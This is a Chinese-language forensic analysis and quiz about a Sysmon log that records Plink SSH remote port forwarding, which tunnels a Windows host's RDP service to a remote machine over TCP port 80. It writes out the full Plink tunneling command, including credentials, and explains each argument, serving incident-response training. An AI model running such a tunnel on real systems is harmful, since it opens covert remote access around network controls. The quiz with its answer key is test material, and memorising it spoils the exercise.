Plink SSH 远程端口转发

样本信息

  • 原始文件：DE_sysmon-3-rdp-tun.evtx

  • SHA-256：1d1eb55d1b7c785db26e19b0d50b9eb4a7928671e4edeb82ea5182cb834c874a

  • 文件大小：69,632 字节（68 KiB）

  • 文件格式：Windows EVTX；1 个有效事件 Chunk，有效记录区间位于文件偏移 0x1200—0xF838

  • 有效 EVTX 记录：73 条，Record ID 1—73，编号连续

  • 日志通道：Microsoft-Windows-Sysmon/Operational

  • 事件提供程序：Microsoft-Windows-Sysmon

  • 日志主机：PC01.example.corp；主要用户：PC01\IEUser

  • 主要事件时间：2019-02-16 10:01:45.887—10:06:38.833 UTC（北京时间 2019-02-16 18:01:45.887—18:06:38.833，取事件 EventData.UtcTime）

  • 相关网络端点：10.0.2.17（PC01）、10.0.2.18（日志解析名称 PC02）、127.0.0.1、127.0.0.2、127.0.0.3

攻击链

Plink 的完整启动命令

Record ID 3，Sysmon Event ID 1 / Process Create：

参数 含义 本日志对应结果
10.0.2.18 Plink 连接的远端 SSH 目标地址 与 Sysmon 3 目的 IP 匹配
-P 80 指定远端连接端口为 80 与 Record 4 的 DestinationPort=80 匹配
-C 启用 SSH 压缩 不意味着绕过检测或特定加密算法
-R 127.0.0.3:4444:127.0.0.2:3389 远程端口转发设置 请求在 SSH 服务器侧 127.0.0.3:4444 监听，把到该端口的连接经 SSH 转到客户端侧 127.0.0.2:3389
-l test 登录远端服务时使用的用户名 test（参数值，不是经身份验证确认的账户）
-pw test 在命令行中直接提供密码 test；明文口令暴露在进程命令行，属于安全风险

Plink 连接远端主机的 TCP 80 端口

Record ID 4，Sysmon Event ID 3 / Network Connection：

同一个 PID / ProcessGuid 的 Plink 进程产生了 10.0.2.17:49185 → 10.0.2.18:80 的 TCP 出站网络连接记录，目标地址与 CommandLine 的 SSH 主机、-P 80 设置一一对应

Plink 两次连接本机 RDP 服务

第一次 RDP 回环连接：Record ID 5—6

第二次 RDP 回环连接：Record ID 23—24

测验

问题 答案
文件共有多少条有效事件？ 73 条（Record ID 1—73）
Sysmon 1 / 3 / 5 / 6 各多少条？ 13 / 42 / 12 / 6
哪个主机记录到这组活动？ PC01.example.corp
可疑工具叫什么？ plink.exe（PuTTY suite 的命令行客户端）
可疑工具完整路径？ C:\Users\IEUser\Desktop\plink.exe
关键创建事件 Record ID？ 3，Sysmon ID 1
关键 Plink 进程的 PID？ 2312
关键 Plink 进程的 ProcessGuid？ 365abb72-dfad-5c67-0000-0010e0811500
Plink 的父进程？ C:\Windows\System32\cmd.exe，PID 3904
谁启动了 Plink？ PC01\IEUser
完整 Plink 命令？ plink.exe 10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw test
-R 代表什么？ SSH Remote Port Forwarding，远程端口转发
SSH 服务端 IP 与端口？ 10.0.2.18:80（从命令参数和网络连接一致性确认目标）
TCP 80 是否意味着真正 HTTP？ 否；不能从端口服务名推断应用层协议
关键 SSH 连接的源 IP/端口？ 10.0.2.17:49185
远端请求监听的地址/端口？ 127.0.0.3:4444（配置值，不等于实际监听已确认）
隧道映射到哪个目标？ PC01 侧的 127.0.0.2:3389
向远端 80 连接的是哪条记录？ Record 4（Sysmon 3）
两次 Plink→RDP 的记录？ Records 5、23（Sysmon 3）
两次 RDP 连接的源端口？ 49186、49187
两组服务端对应记录？ Records 6、24，svchost.exe PID 1276
记录了哪两种协议？ Sysmon 3：TCP 12 条、UDP 30 条
上一条 Plink 进程终止 Record ID？ 2，PID 3520，与当前 PID 2312 不同
本文件包含 4624/1149 登录成功证据吗？ 不包含
-l 指定的用户名？ test
-pw 指定的密码？ test（命令行明文，暴露风险）
-C 有什么作用？ 启用 SSH 压缩
与 RDP 相关的驱动？ rdpdd.dll，Sysmon 6 Records 16—17
VirtualBox 显示驱动是什么？ VBoxDisp.dll，在 Record 25、27、42 出现
本次核心活动日期（UTC）？ 2019-02-16
之前 5156 核心活动日期？ 2019-02-13；不得合并为同一会话
XML SystemTime 与前条记录头是否存在对应异常？ 存在，Record 2—73 全部 72 条吻合
哪条记录头时间无效？ Record 73，FILETIME=0
能否确认远端 127.0.0.3:4444 成功监听？ 不能；缺 PC02 SSH 服务端记录
能否确认 RDP 成功登录？ 不能；需 4624/1149/LocalSessionManager 等进一步佐证
